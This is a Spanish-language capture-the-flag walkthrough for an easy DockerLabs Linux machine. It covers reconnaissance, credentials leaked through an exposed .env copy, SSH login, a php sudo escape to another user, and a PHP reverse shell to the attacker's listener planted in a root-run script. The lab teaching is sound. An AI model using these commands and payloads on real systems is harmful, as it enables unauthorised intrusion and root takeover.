Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #credential-leak #ssh #sudo-abuse #cron-abuse #reverse-shell
 
![](assets/Pasted%20image%2020251108153451.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
> ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.315 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.315/0.315/0.315/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> sudo nmap -p- --open -sS -Pn -n --min-rate 5000 172.17.0.2
-----------------------------------------------------------------
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:30:D5:BE:7C:49 (Unknown)
```

- Puertos 22 y 80 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 22,80 -sS -sCV --min-rate 5000 -Pn -n 172.17.0.2 -oN target.txt
--------------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fb:64:7a:a5:1f:d3:f2:73:9c:8d:54:8b:65:67:3b:11 (RSA)
|   256 47:e1:c1:f2:de:f5:80:0e:10:96:04:95:c2:80:8b:76 (ECDSA)
|_  256 b1:c6:a8:5e:40:e0:ef:92:b2:e8:6f:f3:ad:9e:41:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mi Landing Page - Ciberseguridad
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 02:30:D5:BE:7C:49 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
- Puerto 80 HTTP Apache httpd 2.4.41 (Ubuntu)

## Enumeración

### Puerto 80 HTTP

La página principal es una landing page personal sobre ciberseguridad.

![](assets/Pasted%20image%2020251108154912.png)

**Código Fuente.**

Inspeccionando el código fuente encuentro referencias a varios archivos JavaScript.

![](assets/Pasted%20image%2020251108165633.png)

**Fuzzing de Directorios.**

Utilizo `gobuster` para descubrir posibles recursos en el servidor web.

```bash
> gobuster dir -w raft-large-directories.txt -u http://172.17.0.2/ -x html,php,js,txt,py
------------------------------------------------------------------------------------------
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/script.js            (Status: 200) [Size: 2822]
/index.html           (Status: 200) [Size: 9487]
/imagenes.js          (Status: 200) [Size: 398]
/server-status        (Status: 403) [Size: 275]
/whoami               (Status: 301) [Size: 309] [--> http://172.17.0.2/whoami/]
/index.html           (Status: 200) [Size: 9487]
```

- Encuentro un directorio `/whoami` y varios archivos JavaScript.

## Explotación

### Fuga de Credenciales en script.js

Inspecciono el archivo `script.js` y encuentro un comentario raro.

```js
// Funcionalidad para ocultar/mostrar el header al hacer scroll y el secretito de la web
console.log("Se ha prohibido el acceso al archivo .env, que es donde se guarda la password de backup, pero hay una copia llamada .env_de_baluchingon visible jiji")
let lastScrollTop = 0;
const header = document.querySelector('header');
const delta = 5; // La cantidad mínima de scroll para ocultar el header
```

El comentario indica que existe un archivo `.env_de_baluchingon` accesible que contiene credenciales de backup.

### Acceso al archivo de credenciales

Intento acceder directamente al archivo desde la raíz del servidor web.

```
http://172.17.0.2/.env_de_baluchingon
```

El archivo es accesible y contiene credenciales en texto plano.

![](assets/Pasted%20image%2020251108160744.png)

- Encuentro credenciales: `balu:baluchingon123`

### Acceso SSH

Con las credenciales encontradas, me conecto por SSH.

```bash
> ssh balu@172.17.0.2
balu@172.17.0.2's password: baluchingon123
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)

balu@6cde27e6f35a:~$ whoami
balu
balu@6cde27e6f35a:~$ id
uid=1000(balu) gid=1000(balu) groups=1000(balu)
```

## Escalada de Privilegios

Dentro del sistema enumero binarios que pueda ejecutar con privilegios elevados.

```bash
balu@6cde27e6f35a:~$ sudo -l
---------------------------------------------------------
User balu may run the following commands on 6cde27e6f35a:
    (chocolate) NOPASSWD: /usr/bin/php
```

- Puedo ejecutar `php` como el usuario `chocolate` sin contraseña.

### Migración al usuario chocolate

Con ayuda de [GTFOBins](https://gtfobins.github.io/gtfobins/php/) abuso del binario `php` para migrar al usuario `chocolate`.

```bash
> balu@6cde27e6f35a:~$ sudo -u chocolate /usr/bin/php -r 'system("/bin/bash");'
chocolate@6cde27e6f35a:/home/balu$ whoami
chocolate
```

### Enumeración de procesos

Intento enumerar privilegios sudo como `chocolate`, pero requiere contraseña.

```bash
chocolate@6cde27e6f35a:/home/balu$ sudo -l
[sudo] password for chocolate:
```

Enumero el sistema en busca de archivos modificables o procesos interesantes. Encuentro un archivo en `/opt` que pertenece a `chocolate`.

```bash
chocolate@6cde27e6f35a:/opt$ ls -la
---------------------------------------------------------
-rw-r--r-- 1 chocolate chocolate 59 May  7  2024 script.php
```

Inspecciono el contenido del script.

```php
chocolate@6cde27e6f35a:/opt$ cat script.php
<?php echo 'Script de pruebas en fase de beta testing'; ?>
```

### Análisis de procesos de root

Enumero los procesos que está ejecutando el usuario root.

```bash
chocolate@6cde27e6f35a:/opt$ ps aux | grep root
--------------------------------------------------
root   1  0.0  0.0   2616  1428 ? Ss 21:33 0:00 /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done
```

El usuario root está ejecutando un **bucle infinito** que ejecuta `/opt/script.php` cada 5 segundos. Como tengo permisos de escritura sobre este archivo, puedo modificarlo para ejecutar código arbitrario como root.

### Reverse Shell como root

Me pongo en escucha en mi máquina atacante.

```bash
> sudo nc -nlvp 443
listening on [any] 443 ...
```

Modifico el contenido de `script.php` para incluir una reverse shell en PHP.

```bash
chocolate@6cde27e6f35a:/opt$ echo '<?php $sock=fsockopen("172.17.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' > /opt/script.php
chocolate@6cde27e6f35a:/opt$ cat script.php
<?php $sock=fsockopen("172.17.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

Después de esperar unos segundos, el proceso ejecutado por root ejecuta el script modificado y recibo la conexión.

```bash
Connection received on 172.17.0.2 48862
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

***PWNED***